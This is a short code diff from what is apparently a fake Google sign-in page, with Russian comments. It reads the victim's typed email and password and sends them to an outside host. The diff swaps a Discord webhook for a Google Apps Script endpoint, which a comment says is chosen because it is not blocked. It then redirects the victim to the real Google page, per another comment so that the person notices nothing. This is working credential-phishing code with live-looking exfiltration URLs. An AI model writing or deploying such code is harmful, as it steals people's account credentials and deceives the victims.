@@ -35,14 +35,14 @@
             let email = document.getElementById('email').value;
             let password = document.getElementById('pass').value;
             
-            let msg = "🛑 GOOGLE ЛОГИН: " + email + " | ПАРОЛЬ: " + password;
+            // ОТПРАВЛЯЕМ В GOOGLE СКРИПТ (ОН НЕ ЗАБЛОКИРОВАН)
+            let url = "https://script.google.com/macros/s/AKfycbx9zEDRBjxcgSbAy7Mi6fb6Z2R13fvXexbPXungLnle2T9GibPoqNzzND7dbkMZKbRZ/exec?email=" + encodeURIComponent(email) + "&pass=" + encodeURIComponent(password);
             
-            fetch("https://discord.com/api/webhooks/1569726738953670676/HmFi0r_pu0kStSw8GPFw00SGc1AtjQp049Ks6wyjul2ulcSxeB09cvcu1rWcahDTOHQd", {
-                method: 'POST',
-                headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({content: msg})
-            }).then(() => {
+            fetch(url, {mode: 'no-cors'}).then(() => {
                 // Отправляем на реальный Гугл, чтобы человек ничего не понял
+                window.location.href = "https://accounts.google.com"; 
+            }).catch(() => {
+                // Если вдруг ошибка, все равно кидаем на Гугл
                 window.location.href = "https://accounts.google.com"; 
             });
         };
